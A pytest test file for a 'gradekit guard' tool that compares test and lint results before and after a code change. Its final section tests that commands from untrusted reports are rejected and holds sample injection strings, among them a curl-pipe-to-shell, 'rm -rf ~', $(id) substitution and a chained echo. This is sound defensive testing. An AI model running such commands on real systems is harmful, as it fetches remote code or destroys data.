"""The improver guard (4.3, A12): `guard snapshot` before any change, `guard compare` after, and the
before → after table in the improvement log. "Never trade one benchmark for another" becomes checkable."""
import json
import os
import subprocess
import sys

import pytest

from conftest import SRC

KIT = [sys.executable, str(SRC / "tools" / "gradekit.py")]
PY = f'"{sys.executable}"'

# A stand-in for a test runner and a linter, driven by state.json, so each test sets exactly what changes.
CHECKS_PY = '''
import json, sys, time
s = json.load(open("state.json"))
if sys.argv[1] == "tests":
    time.sleep(s.get("sleep", 0))
    parts = [f"{s['failed']} failed"] if s["failed"] else []
    parts.append(f"{s['passed']} passed")
    print("." * s["passed"])
    print(", ".join(parts) + " in 0.01s")
    sys.exit(1 if s["failed"] else 0)
print(f"Found {s['lint']} errors." if s["lint"] else "All checks passed!")
sys.exit(1 if s["lint"] else 0)
'''


def env():
    return dict(os.environ, PYTHONDONTWRITEBYTECODE="1", GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@example.com",
                GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@example.com")


def gk(*args, cwd, code=0):
    r = subprocess.run(KIT + [str(a) for a in args], cwd=cwd, env=env(), capture_output=True, text=True)
    assert r.returncode == code, r.stdout + r.stderr
    return r


def git(cwd, *args):
    return subprocess.run(["git", "-C", str(cwd), *args], env=env(), capture_output=True, text=True, check=True).stdout.strip()


def set_state(repo, **kw):
    s = json.loads((repo / "state.json").read_text())
    s.update(kw)
    (repo / "state.json").write_text(json.dumps(s))


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "code"
    (r / "src").mkdir(parents=True)
    (r / "tests").mkdir()
    (r / ".github" / "workflows").mkdir(parents=True)
    (r / "checks.py").write_text(CHECKS_PY)
    (r / "state.json").write_text(json.dumps({"passed": 10, "failed": 0, "lint": 3}))
    (r / "src" / "app.py").write_text("import os\n\n\ndef total(xs):\n    return sum(xs)\n")
    (r / "tests" / "test_app.py").write_text("from src.app import total\n\n\ndef test_total():\n    assert total([1, 2]) == 3\n")
    (r / ".github" / "workflows" / "ci.yml").write_text("on: push\njobs: {}\n")
    (r / ".gitignore").write_text("__pycache__/\n")
    git(tmp_path, "init", "-q", "-b", "main", str(r))
    git(r, "add", "-A")
    git(r, "commit", "-qm", "start")
    return r


def snapshot(repo, *extra):
    return gk("guard", "snapshot", "--check", f"tests={PY} checks.py tests", "--check", f"lint={PY} checks.py lint", *extra, cwd=repo)


def compare(repo, *extra, code=0):
    r = gk("guard", "compare", *extra, "--json", cwd=repo, code=code)
    return json.loads(r.stdout)


# --------------------------------------------------------------------------- reading tool output

@pytest.mark.parametrize("output, expected", [
    ("....\n=== 1 failed, 41 passed, 2 skipped, 3 warnings in 1.20s ===", {"failed": 1, "passed": 41, "skipped": 2, "warnings": 3}),
    ("41 passed in 0.12s", {"passed": 41}),
    ("Ran 12 tests in 0.010s\n\nFAILED (failures=1, errors=2, skipped=3)", {"passed": 6, "failed": 1, "errors": 2, "skipped": 3}),
    ("Ran 4 tests in 0.001s\n\nOK", {"passed": 4, "failed": 0, "errors": 0, "skipped": 0}),
    ("Tests:       1 failed, 2 skipped, 40 passed, 43 total", {"failed": 1, "skipped": 2, "passed": 40}),
    (" Tests  1 failed | 40 passed | 2 skipped (43)", {"failed": 1, "passed": 40, "skipped": 2}),
    ("  40 passing (12ms)\n  2 pending\n  1 failing", {"passed": 40, "pending": 2, "failed": 1}),
    ("--- FAIL: TestX (0.00s)\nFAIL\nFAIL\texample.com/a\t0.002s\nok  \texample.com/b\t0.001s",
     {"failed": 1, "packages_failed": 1, "packages_ok": 1}),
    ("test result: ok. 5 passed; 0 failed; 1 ignored; 0 measured\ntest result: FAILED. 2 passed; 1 failed; 0 ignored;",
     {"passed": 7, "failed": 1, "skipped": 1}),
    ("43 examples, 1 failure, 2 pending", {"passed": 40, "failed": 1, "pending": 2}),
    ("src/a.py:1:1: F401 unused\nFound 3 errors.\n[*] 2 fixable", {"problems": 3}),
    ("All checks passed!", {"problems": 0}),
    ("Success: no issues found in 4 source files", {"problems": 0}),
    ("\n✖ 5 problems (3 errors, 2 warnings)\n", {"problems": 5, "warnings": 2}),
    ("Your code has been rated at 9.12/10 (previous run: 9.00/10)", {"pylint_score": 9.12}),
    ("Name    Stmts   Miss  Cover\nTOTAL     120     12    90%\n10 passed in 1s", {"coverage_pct": 90.0, "passed": 10}),
    ("total:\t(statements)\t81.5%", {"coverage_pct": 81.5}),
    ("a.py:1:1: E501 line too long\nb.py:2:3: W291 trailing", {"diagnostics": 2}),
    ("\x1b[32m3 passed\x1b[0m in 0.01s", {"passed": 3}),
    ("built in 2s", {}),
])
def test_counts_from_common_tools(gk, output, expected):
    assert gk.guard_counts(output) == expected


@pytest.mark.parametrize("command, kind", [
    ("pytest -q", "tests"), ("python3 -m pytest --cov=pkg", "tests"), ("npm test", "tests"), ("go test ./...", "tests"),
    ("ruff check .", "lint"), ("npx eslint src", "lint"), ("go vet ./...", "lint"), ("mypy src", "types"),
    ("npx tsc --noEmit", "types"), ("npm run build", "build"), ("pip-audit", "audit"), ("coverage report", "coverage"),
    ("git log --oneline", None), ("cloc .", None), ("pip install -e .", None),
])
def test_report_commands_are_recognised(gk, command, kind):
    assert gk.guard_kind(command) == kind


# --------------------------------------------------------------------------- snapshot and compare

def test_snapshot_is_kept_in_git_and_nothing_changed_passes(repo):
    r = snapshot(repo)
    assert "tests: 10 passed (ok)" in r.stdout and "lint: 3 problems (exit 1)" in r.stdout
    snap = json.loads((repo / ".git" / "gradekit" / "guard-before.json").read_text())
    assert [c["name"] for c in snap["checks"]] == ["tests", "lint"]
    assert snap["code"]["commit"] == git(repo, "rev-parse", "HEAD") and snap["code"]["dirty"] is False
    assert snap["markers"]["suppressions"]["total"] == 0 and ".github/workflows/ci.yml" in snap["gate_files"]
    assert git(repo, "status", "--porcelain") == "", "the snapshot must never show up as a change to commit"
    res = compare(repo)
    assert res["exit_code"] == 0 and res["result"]["verdict"] == "PASS" and res["result"]["regressions"] == []


def test_compare_lists_what_got_worse(repo):
    snapshot(repo)
    set_state(repo, passed=9, failed=1, lint=1)
    (repo / "src" / "app.py").write_text("import os  # noqa: F401\n\n\ndef total(xs):\n    return sum(xs)\n")
    git(repo, "commit", "-qam", "change")
    res = compare(repo, code=2)
    out = res["result"]
    assert res["exit_code"] == 2 and out["verdict"] == "FAIL"
    assert set(out["regressions"]) == {"tests.exit", "tests.passed", "tests.failed", "suppressions"}
    assert "lint.problems" in out["improved"] and out["commits"] == 1
    assert "more in src/app.py" in res["text"] and "verdict: FAIL" in res["text"]
    assert (repo / ".git" / "gradekit" / "guard-compare.json").is_file()


def test_a_deliberate_change_can_be_explained(repo):
    snapshot(repo)
    set_state(repo, passed=8)
    res = compare(repo, "--explain", "tests.passed=removed the tests of the deleted export helper", "--explain", "lint.problems=typo")
    out = res["result"]
    assert res["exit_code"] == 0 and out["verdict"] == "PASS"
    assert out["explained"] == [{"key": "tests.passed", "reason": "removed the tests of the deleted export helper"}]
    assert out["unused_explanations"] == ["lint.problems"] and "matched nothing" in res["text"]


def test_skipped_tests_count_as_worse(repo):
    snapshot(repo)
    (repo / "tests" / "test_app.py").write_text("import pytest\nfrom src.app import total\n\n\n@pytest.mark.skip\ndef test_total():\n"
                                                "    assert total([1, 2]) == 3\n")
    assert compare(repo, code=2)["result"]["regressions"] == ["skipped_tests"]


def test_a_check_that_now_times_out_is_worse(repo):
    snapshot(repo)
    set_state(repo, sleep=5)
    res = compare(repo, "--timeout", "1", code=2)
    assert res["result"]["regressions"] == ["tests.exit"] and "now times out" in res["text"]


def test_gate_files_are_listed_for_review_without_failing(repo):
    snapshot(repo)
    (repo / ".github" / "workflows" / "ci.yml").write_text("on: push\njobs: {lint: {}}\n")
    (repo / "pyproject.toml").write_text("[tool.ruff]\n")
    out = compare(repo)["result"]
    assert out["verdict"] == "PASS" and out["review"] == [".github/workflows/ci.yml", "pyproject.toml"]


def test_compare_always_runs_every_check_the_snapshot_ran(repo, tmp_path):
    snapshot(repo)
    gk("guard", "snapshot", "--check", f"tests={PY} checks.py tests", "--out", tmp_path / "after.json", cwd=repo)
    out = compare(repo, "--after", tmp_path / "after.json", code=2)["result"]
    assert out["regressions"] == ["lint"], "dropping a check must not make the result look clean"


def test_list_shows_the_checks_and_runs_nothing(repo, tmp_path):
    report = tmp_path / "report.json"
    report.write_text(json.dumps({"commands_run": [{"command": "pytest -q", "result_summary": ""},
                                                   {"command": "git log -5", "result_summary": ""},
                                                   {"command": "ruff check .", "result_summary": ""}]}))
    r = gk("guard", "snapshot", "--from-report", report, "--check", f"marker={PY} -c \"open('ran','w')\"", "--list", "--json", cwd=repo)
    res = json.loads(r.stdout)["result"]
    assert [(c["name"], c["command"], c["from"]) for c in res["checks"]][1:] == [("tests", "pytest -q", "report"), ("lint", "ruff check .", "report")]
    assert "git log -5" in res["notes"][0]
    assert not (repo / "ran").exists() and not (repo / ".git" / "gradekit").exists()


def test_detects_checks_when_none_are_given(repo):
    (repo / "pyproject.toml").write_text("[tool.pytest.ini_options]\n[tool.ruff]\n")
    res = json.loads(gk("guard", "snapshot", "--list", "--json", cwd=repo).stdout)["result"]
    assert [c["name"] for c in res["checks"]] == ["tests", "lint"] and "detected" in res["notes"][0]


def test_path_limits_the_scan_and_where_checks_run(repo):
    (repo / "pkg").mkdir()
    (repo / "pkg" / "state.json").write_text(json.dumps({"passed": 2, "failed": 0, "lint": 0}))
    (repo / "pkg" / "checks.py").write_text(CHECKS_PY)
    gk("guard", "snapshot", "--path", "pkg", "--check", f"tests={PY} checks.py tests", cwd=repo)
    (repo / "src" / "app.py").write_text("import os  # noqa\n")
    out = compare(repo)["result"]
    assert out["verdict"] == "PASS", "a suppression outside --path isn't this project's"
    set_state(repo / "pkg", failed=1)
    assert "tests.failed" in compare(repo, code=2)["result"]["regressions"]


def test_outside_git_the_snapshot_needs_out(tmp_path):
    (tmp_path / "x.py").write_text("")
    r = gk("guard", "snapshot", "--check", f"t={PY} -c 0", cwd=tmp_path, code=1)
    assert "give --out FILE" in r.stderr
    gk("guard", "snapshot", "--check", f"t={PY} -c 0", "--out", tmp_path / "snap.json", cwd=tmp_path)
    gk("guard", "compare", "--before", tmp_path / "snap.json", "--out", tmp_path / "cmp.json", cwd=tmp_path)


def test_compare_without_a_snapshot_says_what_to_do(repo):
    assert "run `gradekit guard snapshot`" in gk("guard", "compare", cwd=repo, code=1).stderr


# --------------------------------------------------------------------------- the improvement log

def test_improvement_log_carries_the_guard_table(repo, tmp_path):
    snapshot(repo)
    set_state(repo, passed=12, lint=4)
    compare(repo, "--explain", "lint=new rule E501 added to CI flags old lines", code=0)
    log = tmp_path / "log.json"
    log.write_text(json.dumps({"done": [{"action_id": "A2-act-1", "commit": "abc1234", "resolves": ["A2-001"], "check": "guard"}]}))
    md = gk("render", "log", log, "--guard", repo / ".git" / "gradekit" / "guard-compare.json", cwd=repo).stdout
    assert "**Guard**" in md and "Verdict: **PASS**" in md
    assert f"| tests | `{PY} checks.py tests` | 10 passed (ok) | 12 passed (ok) | better |" in md
    assert "| lint |" in md and "worse, explained" in md and "new rule E501" in md
    assert md.index("**Guard**") < md.index("**Done**")
    bad = gk("render", "log", log, "--guard", repo / ".git" / "gradekit" / "guard-before.json", cwd=repo, code=1)
    assert "isn't a `guard compare` result" in bad.stderr


# --------------------------------------------------------------------------- found by the 4.3 release gate

@pytest.mark.parametrize("command, runnable", [
    ("black --check . (black 20.8b1, as pinned)", "black --check ."),
    ("python -m pytest test_schedule.py -q  (venv without pytz)", "python -m pytest test_schedule.py -q"),
    ("make && (cd docs; make html)", "make && (cd docs; make html)"),
    ("pytest -q", "pytest -q"),
])
def test_graders_notes_after_a_command_are_dropped(gk, command, runnable):
    assert gk.guard_trim_note(command) == runnable


def test_report_commands_that_install_packages_are_left_out(repo, tmp_path):
    report = tmp_path / "report.json"
    report.write_text(json.dumps({"commands_run": [
        {"command": "pip install -r requirements-dev.txt && python -m pytest -q (Python 3.11)", "result_summary": ""},
        {"command": "npm ci && npm test", "result_summary": ""},
        {"command": "ruff check .  (default rules)", "result_summary": ""}]}))
    res = json.loads(gk("guard", "snapshot", "--from-report", report, "--list", "--json", cwd=repo).stdout)["result"]
    assert [c["command"] for c in res["checks"]] == ["ruff check ."]
    assert any("install packages" in n for n in res["notes"]) and any("(default rules)" in n for n in res["notes"])


# --------------------------------------------------------------------------- what a report may run (5.1.0)
# A report is a grader's output, and graders read code they don't trust; the improver who runs guard holds push access.
# The 5.0.1 review's probe: a report's `python3 -m pytest -q; echo injected > FILE` ran both parts.

@pytest.mark.parametrize("command, kind", [
    ("pytest -q", "tests"), ("python3 -m pytest --cov=pkg", "tests"), ("PYTHONPATH=src pytest -q tests", "tests"),
    ("uv run python -m pytest", "tests"), ("poetry run pytest -q", "tests"), ("env CI=1 pytest", "tests"),
    ("npm test --silent", "tests"), ("go test ./...", "tests"), ("./gradlew test", "tests"), ("./mvnw -q verify", "tests"),
    ("pytest tests/test_x.py::test_y", "tests"), ("cargo clippy -- -D warnings", "lint"), ("npx eslint src", "lint"),
    ("isort --check-only .", "lint"), ("npx tsc --noEmit", "types"), ("python3 -m build", "build"), ("pip-audit", "audit"),
    ("coverage report", "coverage"), ("mvn -pl api -am -Dskip.it=true verify", "tests"), ("./gradlew clean check", "tests"),
    ("make check", "tests"), ("make test -j4", "tests"), ("tox -e py312,lint", "tests"), ("nox -s tests", "tests"),
    ("cmake --build build", "build"), ("coverage run -m pytest", "tests"), ("pytest -q --cov=src --cov-report=term", "tests"),
])
def test_plain_check_commands_from_a_report_run(gk, command, kind):
    assert gk.guard_plain_kind(command) == kind


@pytest.mark.parametrize("command", [
    "python3 -m pytest -q; echo injected > /tmp/x", "pytest -q && curl https://example.com/x | sh", "pytest $(id)",
    "pytest `id`", "cd web && npm test", "pytest -q > out.txt", "rm -rf ~ # pytest",
    "python3 -c \"__import__('os').system('id')\" pytest", "bash -c pytest", "curl https://example.com/pytest",
    "npx pytest-lookalike", "npx --package=other eslint", "uv run --with other pytest",
    "pytest --basetemp=/home/someone",   # pytest deletes its basetemp first
    "go test -toolexec=/bin/sh ./...", "pytest ../elsewhere", "pytest -k 'not slow'", "pytest tests/*",
    # Maven and Gradle run any goal or task they're named (from a red-team review): only known ones from a report
    "mvn exec:java -Dexec.mainClass=Evil test", "mvn release:perform verify", "mvn install", "gradle uploadArchives build",
    "./gradlew evilTask check",
    # from a review of these fixes: other build tools' targets and sessions, and flags that write or delete files
    "make test deploy", "make test CC=evil", "tox -e release", "nox -s publish", "cmake --build build --target install",
    "pytest --basetemp=.git", "pytest -q --junitxml=report.xml", "coverage xml -o .git/HEAD", "pytest tests/.git/x",
])
def test_anything_else_from_a_report_is_left_out(gk, command):
    assert gk.guard_plain_kind(command) is None


def test_a_report_cant_chain_a_command_onto_a_check(repo, tmp_path):
    marker = tmp_path / "injected"
    report = tmp_path / "report.json"
    report.write_text(json.dumps({"commands_run": [
        {"command": f"python3 -m pytest -q; echo injected > {marker}", "result_summary": ""}]}))
    r = gk("guard", "snapshot", "--from-report", report, "--check", f"tests={PY} checks.py tests", "--out", tmp_path / "s.json",
           "--json", cwd=repo)
    res = json.loads(r.stdout)["result"]
    assert not marker.exists(), "the chained command never ran"
    assert [c["command"] for c in res["checks"]] == [f"{PY} checks.py tests"]
    assert any("aren't one plain check command" in n and "--check NAME=COMMAND" in n for n in res["notes"])


@pytest.mark.parametrize("output, expected", [
    ("would reformat a.py\n\nOh no! 💥 💔 💥\n3 files would be reformatted, 1 file would be left unchanged.", {"problems": 3}),
    ("All done! ✨ 🍰 ✨\n4 files would be left unchanged.", {"problems": 0}),
    ("Name  Version ID\nblack 20.8b1  PYSEC-2024-48\n\nFound 5 known vulnerabilities in 1 package", {"vulnerabilities": 5}),
    ("No known vulnerabilities found", {"vulnerabilities": 0}),
    ("found 0 vulnerabilities", {"vulnerabilities": 0}),
])
def test_counts_from_formatters_and_audits(gk, output, expected):
    assert gk.guard_counts(output) == expected


def test_coverage_reads_naturally(gk):
    assert gk.guard_state({"exit_code": 0, "counts": {"passed": 81, "coverage_pct": 99.0}}) == "81 passed, coverage 99% (ok)"


def test_an_action_done_in_several_commits(gk):
    md = gk.render_improve_log({"done": [{"action_id": "B4-act-1", "commit": "2378b1f d279980", "resolves": ["B4-001"]},
                                         {"action_id": "A3-act-1", "commit": ["920f39d", "abc1234"]}]})
    assert "**B4-act-1** in `2378b1f`, `d279980`" in md and "**A3-act-1** in `920f39d`, `abc1234`" in md
